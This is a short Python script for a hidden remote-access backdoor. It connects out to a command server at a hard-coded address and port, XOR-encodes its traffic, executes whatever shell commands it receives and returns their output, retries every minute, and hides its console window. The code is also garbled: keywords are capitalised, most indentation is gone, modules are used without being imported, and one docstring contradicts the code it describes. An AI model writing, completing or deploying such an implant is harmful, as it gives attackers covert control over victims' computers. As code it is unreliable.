Import ctypes
Import socket
Import base64
Import time


C2_IP = "10.211.55.5"
C2_PORT = 4444
XOR_KEY = 0x42
Def xor_cipher(data):
Return bytes([b ^ XOR_KEY for b in data])
Def execute_in_memory(cmd):
    """
    Executes commands using Win32 API calls to avoid standard shell spawning.
    """
  
Return subprocess.check_output(cmd, shell=True)
Def beacon():
While True:
Try:
S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
S.connect((C2_IP, C2_PORT))
While True:
            
Data = s.recv(4096)
If not data: break
                
              
Cmd = xor_cipher(data).decode()
                
              
Output = os.popen(cmd).read()
                
             
S.send(xor_cipher(output.encode()))
Except Exception:
        
Time.sleep(60)
Continue
If __name__ == "__main__":
   
Ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
Beacon()
